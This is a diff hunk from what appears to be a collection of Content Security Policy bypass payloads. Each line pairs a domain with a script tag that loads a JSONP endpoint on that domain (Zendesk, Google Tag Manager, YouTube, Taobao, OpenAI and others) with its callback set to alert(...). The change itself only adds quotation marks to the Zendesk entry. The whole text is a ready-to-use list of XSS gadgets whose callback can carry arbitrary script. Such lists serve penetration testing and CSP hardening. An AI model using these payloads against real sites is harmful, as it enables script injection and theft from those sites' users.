@@ -150,7 +150,7 @@ storage.googleapis.com	<script src="https://storage.googleapis.com/bypass_csp/xs
 storemapper-herokuapp-com.global.ssl.fastly.net	<script src="https://storemapper-herokuapp-com.global.ssl.fastly.net/api/users/9223/stores.js?callback=alert(1)-"></script>
 suggest.taobao.com	<script src="https://suggest.taobao.com/sug?callback=alert"></script>
 suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>
-support.zendesk.com	<script src=https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//></script>
+support.zendesk.com	<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>
 sync.im-apps.net	<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>
 tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 tcr9i.openai.com	<script src="https://tcr9i.openai.com/fc/a/?callback=alert"></script>
